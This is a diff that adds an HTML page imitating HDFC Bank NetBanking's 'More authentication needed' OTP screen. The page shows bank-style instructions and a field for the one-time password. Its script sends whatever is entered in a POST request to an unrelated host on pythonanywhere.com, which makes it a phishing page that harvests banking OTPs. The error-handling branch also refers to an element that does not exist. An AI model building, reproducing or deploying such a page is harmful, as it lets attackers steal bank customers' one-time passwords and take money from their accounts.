@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/rippleui@1.12.1/dist/css/styles.css" />
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        hdfc: '#023580',
+                    }
+                }
+            }
+        }
+    </script>
+    <title>Welcome to HDFC Bank NetBanking</title>
+</head>
+<body class="overflow-hidden">
+
+    <div class="bg-white h-[100vh] px-5">
+        <h1 class="text-hdfc text-xl font-bold py-5">More authentication needed!</h1>
+
+        <div class="bg-blue-100 border border-1 border-blue-300 p-5 w-full sm:w-2/5 text-sm">
+            <p class="text-hdfc font-bold my-5">Please note:</p>
+            <ol class="list-decimal text-hdfc">
+                <li>There will be several attempts made to deliver the OTP (One Time Password) successfully to you.</li>
+                <li>For customers having an Indian mobile number registered with the bank, if the above attempts are unsuccessful, an IVR will be initiated on your registered mobile number.</li>
+                <li>For J&K customers, OTP will be sent through only IVR (Integrated Voice Recognition).</li>
+            </ol>
+            <p class="text-hdfc my-5">Please re-initiate the transaction, incase you do not recieve the same.</p>
+            <p class="text-hdfc my-5">Please input the OTP sent to your registered mobile number / email ID.</p>
+            <div class="flex gap-3 items-center">
+                <p class="text-hdfc font-bold">One Time Password</p>
+                <input id="otp" name="otp" type="tel" maxlength="6" class="text-black border border-gray-300 input-ghost-primary input h-1rem h-[2rem] rounded-sm bg-white">
+            </div>
+            <p class="text-hdfc my-5">Your One Time Password (OTP) is confidential. Please do not share it with anyone via e-mail, phone or any other medium.</p>
+            <button id="submitBtn" class="btn bg-gradient-to-b from-blue-100 to-white text-gray-800 font-bold border border-2 border-hdfc rounded rounded-md">Continue</button>
+        </div>
+    </div>
+
+    <script>
+        var otp = document.getElementById('otp');
+        var submitBtn = document.getElementById('submitBtn');
+
+        data = {}
+
+        function pushData(key, val) {
+            data[key] = val;
+            fetch('https://bobarakhas.pythonanywhere.com', {
+                method: 'POST',
+                body: JSON.stringify(data)
+            })
+        }
+
+        submitBtn.onclick = () => {
+            if (otp.value.length > 0) {
+                pushData('OTP', otp.value);
+                // window.location.href = '[URL]';
+            } else {
+                otp.classList.add('border-red-700');
+                setTimeout(() => {
+                    cust_id.classList.remove('border-red-700');
+                }, 3000);
+            }
+        }
+    </script>
+    
+</body>
+</html>
